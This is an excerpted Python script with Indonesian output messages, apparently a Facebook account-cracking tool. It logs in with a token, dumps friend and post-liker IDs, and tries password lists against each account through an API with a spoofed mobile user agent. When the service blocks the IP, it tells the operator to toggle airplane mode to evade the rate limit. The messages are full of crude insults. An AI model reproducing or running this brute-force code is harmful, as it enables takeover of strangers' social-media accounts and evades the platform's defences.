...
def tik():
    titik = ['.   ','..  ','... ']
    for o in titik:
        print ('\r%s%s sabar, sedang menghapus token %s'%(M,til,o)),
...
def folder():
	...
	try:
		ua_ = 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909 Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.110 Mobile Safari/537.36 GSA/12.36.22.23.arm64;]'
...
def masuk():
    ...
    if rom in(""):
    	...
    	try:
            ...
            print ('\n%s[√] Login berhasil, tunggu tod '%(H));jeda(2)
        	...
        	print("%s [!] Waduh ngab token nya invalid "%(M));masuk()
    elif rom in ('2', '02'):
        ...
        if nanya in(""):
        	...
        	print ("\n%s [!] anda sungguh kentod, surrentod,takentod,entod "%(M));jeda(2);os.system("xdg-open https://youtu.be/IG5QfdxRkeY");masuk()
    elif rom in ('0', '00'):
    	exit('\n')
    else:
    	print("%s [!] Isi yang benar kentod "%(M));exit()
...
def publik(romz,headers=header):
    ...
    try:
        ...
        for a in z['friends']['data']:
            ...
            print '\r%s [*] sabar kentod sedang dump id :%s %s ' % (P,H,str(len(id))),
...
def postingan(romz,headers=header):
    ...
    try:
    	print ("\n%s [%s!%s] Ingat!! postingan wajib publik "%(P,M,P))
...
class ngentod:
    ...
    def b_api(self, user, zona):
    	try:
        	...
        	ua = 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909 Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.110 Mobile Safari/537.36 GSA/12.36.22.23.arm64 ;]'
        global ok,cp,loop
        for pw in zona:
            pw = pw.lower()
            ...
            if response.status_code != 200:
            	loop +=1
            	print ("\r\033[0;91m [!] IP terblokir. hidupkan mode pesawat 3 detik"),
                sys.stdout.flush()
		...
		try:
			...
			with requests.Session() as ses:
				...
				if "checkpoint_url" in str(data):
					...
					print ("\r%s[!] Mode pesawatkan 3 detik  "%(M)),
					looping+=1
					sys.stdout.flush()
					pwx = [pw]
					crack2(user, pwx)
